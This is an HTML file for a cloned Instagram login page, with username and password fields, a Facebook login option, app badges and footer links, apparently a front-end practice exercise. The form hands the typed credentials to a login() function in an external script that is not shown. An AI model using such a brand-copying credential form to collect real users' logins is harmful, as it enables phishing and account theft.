<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="Viewport" content="width=device-width,initial scale=1.0">
        <title>Instagram Login page clone</title>
        <link rel="stylesheet" href="style.css">
    </head>
    <body>

        <div class="container">
            <div class="phone-img">
                
            </div>

            <div>
                <div class="login-box">
                    <div class="logo">Instagram</div>

                    <form onsubmit="return login()">
                        <input type="text" id="username" placeholder="phone number,username or email" required>
                        <input type="password" id="password" placeholder="password" required>
                        <button type="submit">Log in</button>
                    </form>

                    <div class="divider"><span>OR</span></div>

                    <div class="fb-login">Log in with Facebook</div>
                    <div class="forgot-pass">Forgot password?</div>
                </div>
                
                <div class="box">
                    <div class="signup-box">
                    Don't have an account? <a href="#">Sign up here</a>
                    </div>
                </div>

                <div class="get-app">
                    <p>Get the app</p>
                    <div class="app-buttons">
                        <img src=https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/1280px-Download_on_the_App_Store_Badge.svg.png alt="App Store">
                        <img src=https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/1280px-Google_Play_Store_badge_EN.svg.png alt="Google Play">
                    </div>
                </div>

                <footer>
                    <div class="footer-links">
                        <a href="#">About</a>
                        <a href="#">Help</a>
                        <a href="#">Press</a>
                        <a href="#">API</a>
                        <a href="#">Jobs</a>
                        <a href="#">Privacy</a>
                        <a href="#">Terms</a>
                        <a href="#">Locations</a>
                        <a href="#">Top Accounts</a>
                        <a href="#">Hashtags</a>
                        <a href="#">Language</a>
                    </div>
                    
                    <div class="footer-copy">
                        2020 Instagram from Meta
                    </div>
                </footer>
            </div>
        </div>

    <script src="1.js"></script>
    </body>
</html>
